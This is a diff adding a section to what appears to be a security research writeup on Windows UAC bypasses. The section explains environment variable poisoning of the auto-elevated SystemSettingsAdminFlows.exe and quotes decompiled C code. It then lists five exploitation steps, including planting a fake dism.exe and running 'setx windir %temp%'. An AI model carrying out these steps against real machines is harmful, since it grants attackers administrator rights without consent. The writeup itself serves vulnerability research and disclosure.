@@ -58,5 +58,44 @@ When searching for new UAC bypasses, the obvious targets are components that aut
 - `Auto elevated executables` - the best way to hunt for these is to look for an embedded manifest in them that says `<autoElevate>true</autoElevate>`.
 - `Auto elevated COM objects` - those are DLLs that are under a specific list
 
+Usually UAC bypasses are logic bugs that let an attacker affect an auto-elevated program's operation or flow in a way that ultimately executes arbitrary code. I'd like to share a few examples I discovered in the past:
 
+## Environment variable poisoning
+The code flow in the auto-elevated `SystemSettingsAdminFlows.exe` when given the command-line argument `InstallInternalDeveloperModePackage` demonstrates this technique well:
+
+```c
+if (!ExpandEnvironmentStringsW(L"%windir%\\system32\\dism.exe, wszAppPath, 0x104))
+{
+    // Handle error
+}
+
+// ...
+
+some_sprintf(
+    wszCommandLine,
+    L"%s /online /norestart /quiet /add-package /packagePath:\"\\\\ntdev.corp.microsoft.com\\release\\%s\\%s.%s.%s\\%s\\FeaturesOnDemand\\neutral\\cabs\\%s\"",
+    wszAppPath,
+    v16,
+    dst,
+    dst,
+    v4,
+    v14,
+    L"Microsoft-OneCore-DeveloperMode-Desktop-Package.cab");
+
+// ...
+
+if (!CreateProcessW(NULL, wszCommandLine, NULL, NULL, 0, 0, NULL, NULL, &tStartupInfo, &tProcInfo)
+{
+    // Handle error
+}
+```
+
+As can be seen, a child process will be created with [CreateProcessW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) with a command-line affected by the `wszAppPath` variable, which in turn was built from the path `%windir%\system32\dism.exe`. Well, since the `windir` environment variable is expanded, we could easily poison it! Exploitation is simple:
+1. Create a new directory `%temp%\system32`.
+2. Place our payload in `%temp%\system32\dism.exe`.
+3. Run `setx windir %temp%`.
+4. Run `SystemSettingsAdminFlows.exe InstallInternalDeveloperModePackage`
+5. Restore the `windir` environment variable after use.
+
+The idea is that auto-elevated processes will spawn child processes with the same integrity level (at least by default, when using `CreateProcessW` as we've seen). A similar idea happens with the `ShellExecute(Ex)W\A` API, as we'll see soon.
 
